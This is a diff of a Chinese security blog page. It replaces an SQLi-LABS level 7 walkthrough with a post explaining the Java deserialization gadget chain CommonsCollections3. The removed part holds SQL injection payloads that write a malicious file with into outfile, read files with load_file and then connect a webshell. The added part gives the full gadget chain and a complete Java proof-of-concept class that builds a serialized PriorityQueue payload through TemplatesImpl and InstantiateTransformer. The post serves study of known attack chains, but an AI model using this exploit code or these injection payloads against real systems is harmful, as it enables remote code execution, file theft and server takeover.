@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="学的越深越发现自己的渺小">
+    <meta name="keywords" content="JAVA反序列篇-CommonsCollections3的由来, 学的越深越发现自己的渺小">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>学的越深越发现自己的渺小</title>
+    <title>JAVA反序列篇-CommonsCollections3的由来 | 学的越深越发现自己的渺小</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">JAVA反序列篇-CommonsCollections3的由来</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-12-04
+                    2022-03-28
                 </div>
                 
 
@@ -459,51 +459,109 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>title: SQLi-LABS 第7关</p>
-<p>data: 2020-12-3 19:25:30</p>
-<p>tags:</p>
-<h4 id="这一关是进行文件导入注入"><a href="#这一关是进行文件导入注入" class="headerlink" title="这一关是进行文件导入注入"></a>这一关是进行文件导入注入</h4><h4 id="①前提条件："><a href="#①前提条件：" class="headerlink" title="①前提条件："></a>①前提条件：</h4><ul>
-<li>要有文件读写权限。</li>
-</ul>
-<pre><code>and (select count(*) from mysql.user)&gt;0</code></pre>
-<p>如果返回正常，说名拥有权限。如果返回错误，则需要进行提权操作。</p>
-<ul>
-<li><p>必须拥有预读取文件的绝对路径。相对路径不行</p>
-</li>
-<li><p>欲读取文件要小于max_allowed_packet</p>
-</li>
-<li><p>预读取文件必须在服务器上</p>
-</li>
-</ul>
-<h4 id="②函数介绍"><a href="#②函数介绍" class="headerlink" title="②函数介绍"></a>②函数介绍</h4><ul>
-<li>into outfile() 写入文件（文件为不存在的文件）</li>
-</ul>
-<pre><code>select ....into outfile &quot;flie_name&quot;`</code></pre>
-<pre><code>id=1&#39;)) union select 1,2,&quot;内容&quot; into outfile &quot;路径\\文件名&quot;</code></pre>
-<p>虽然页面还是会报错，但进入文件夹会发现文件已经生成写入。</p>
-<ul>
-<li>Load_file(file_name)读取文件</li>
-</ul>
-<pre><code>id=1&#39;)) union select 1,2,load_life(路径文件)</code></pre>
-<h4 id="③开始注入"><a href="#③开始注入" class="headerlink" title="③开始注入"></a>③开始注入</h4><ul>
-<li>注入点判断</li>
-</ul>
-<p>这里我是用延时注入进行判断</p>
-<pre><code>?id=1&#39;)) and sleep(3) --+</code></pre>
-<p>正确会3秒后刷新页面。</p>
-<ul>
-<li>列数判断 </li>
-</ul>
-<p>order by 数字</p>
-<ul>
-<li>拥有权限，恶意文件写入</li>
-</ul>
-<pre><code>union select 1,&quot;     &quot;,3 into outflie &quot;           &quot; --+  路径使用双斜杆\\防止转义</code></pre>
-<ul>
-<li><img src="%5Cimages%5C5.png"></li>
-<li>写入成功连接蚁剑</li>
-<li>控制webshell行进文件删减等操作。</li>
-</ul>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当一个漏洞被披露出来随后肯定就会有修补漏洞的补丁。当Java反序列化利用工具<code>ysoserial</code>面世并被大量使用后，遍引起了安全界的轰动。攻防攻防有功就有守，所以开发者们就开始探索可以安全过滤的方法，于是类似<code>SerialKiller</code>这样的工具随之诞⽣。 <code>SerialKiller</code>是⼀个<code>Java</code>反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在黑名单中<code>InvokerTransformer</code>赫然在列，也就切断了<code>CommonsCollections1</code>的利用链,所以<code>CommonsCollections3</code>就出来了。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>Gadget</strong></p>
+<pre><code>Gadget chain:
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                TransformingComparator.compare()
+                    InstantiateTransformer.transform()
+                        TrAXFilter.newInstance()
+                            TemplatesImpl.newTransformer()
+                                TemplatesImpl.getTransletInstance()
+                                    TemplatesImpl.defineTransletClasses()
+                                        TransletClassLoader.defineClass()
+                                            newInstance()
+                                                Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p>可以看到<code>InvokerTransformer</code>类不在链条里了，替换的是<code>InstantiateTransformer</code>和<code>TrAXFilter</code>类。</p>
+<p><strong><code>TrAXFilter</code>类</strong></p>
+<p>它的有参构造方法，会调用形参的<code>newIransfromer</code>方法，我们只要把这里的<code>templates</code>设成<code>TemplatesImpl</code>类就行了。</p>
+<p><img src="E:\boke\blog\source\images\420.png"></p>
+<p><strong><code>InstantiateTransformer</code>类</strong></p>
+<p>实现了<code>Transformer</code>接口，所以也有<code>transform</code>方法，他的作用就是调用构造方法。且这里的<code>input</code>、<code>iParamTypes</code>、<code>iArgs</code>都可控。我们就可以通过<code>TransformingComparator.compare()</code>方法去触发<code>InstantiateTransformer.transform()</code>方法</p>
+<p><img src="E:\boke\blog\source\images\421.png"></p>
+<p><img src="E:\boke\blog\source\images\422.png"></p>
+<p><strong>POC构造</strong></p>
+<pre><code>PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                TransformingComparator.compare()</code></pre>
+<pre><code>TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+        TemplatesImpl.defineTransletClasses()
+            TransletClassLoader.defineClass()
+                newInstance()
+                    Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p>可以直接参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/326296.html">CommonsCollections2引发的思考 - FreeBuf网络安全行业门户</a></p>
+<p><strong>最终poc</strong></p>
+<pre><code>package payload;
+
+import Exp.Evil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.PriorityQueue;
+
+public class CC3 &#123;
+
+    public byte[] getPayload(byte[] clazzBytes) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException, NoSuchMethodException, ClassNotFoundException, NotFoundException, IOException, CannotCompileException &#123;
+
+        byte[][] codes=&#123;clazzBytes&#125;;
+
+        TemplatesImpl templates=new TemplatesImpl();
+        Class tc=templates.getClass();
+
+        Field nameField=tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+
+        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField=tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer transformer = new InstantiateTransformer( new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);
+        TransformingComparator comparator = new TransformingComparator(transformer);
+
+        PriorityQueue queue = new PriorityQueue(2);
+        queue.add(1);
+        queue.add(1);
+
+        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,comparator);
+
+        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);
+        field3.setAccessible(true);
+        field3.set(queue,new Object[]&#123;TrAXFilter.class,TrAXFilter.class&#125;);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+
+    &#125;
+&#125;</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学完了<code>URLDNS、CC1、CC2、CC3、CC6</code>其实就差不多把这个CC链重要部分都理解完了。剩下的几条链就是互相拼接或者为了绕过黑名单而找到新的方法进行替换。</p>
+<p>学完CC利用链，就要运用到实战中才有它的价值。如果一条利用链仅仅只能在本地环境触发成功，那也没什么价值。接下来就是理解<code>JAVA</code>中的一个实战常用的反序列化漏洞<code>Shiro-反序列</code>。但在利用的时候会发现很多链条会触发失败，且会涉及JAVA版本等各种各样问题。我们又该怎么解决呢？下一篇文章我们将来一起探索。</p>
 
             </div>
             <hr/>
@@ -529,7 +587,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://keepaha.com/2021/12/04/SQLi-LABS%20%E7%AC%AC7%E5%85%B3/">http://keepaha.com/2021/12/04/SQLi-LABS%20%E7%AC%AC7%E5%85%B3/</a>
+                    <a href="http://keepaha.com/2022/03/28/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections3%E7%9A%84%E7%94%B1%E6%9D%A5/">http://keepaha.com/2022/03/28/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections3%E7%9A%84%E7%94%B1%E6%9D%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -734,54 +792,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fpass%E7%B3%BB%E5%88%97%E6%94%BB%E5%87%BB/">
+                <a href="/2022/03/28/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections3%E7%9A%84%E7%94%B1%E6%9D%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="内网渗透pass系列攻击">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="JAVA反序列篇-CommonsCollections3的由来">
                         
-                        <span class="card-title">内网渗透pass系列攻击</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-29
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            0xEaS
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8F%E8%87%AA%E5%B7%B1/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="渗透测试之如何隐藏自己">
-                        
-                        <span class="card-title">渗透测试之如何隐藏自己</span>
+                        <span class="card-title">JAVA反序列篇-CommonsCollections3的由来</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -792,7 +814,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections2%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="JAVA反序列篇-CommonsCollections2引发的思考">
+                        
+                        <span class="card-title">JAVA反序列篇-CommonsCollections2引发的思考</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-24
                             </span>
                         <span class="publish-author">
                             
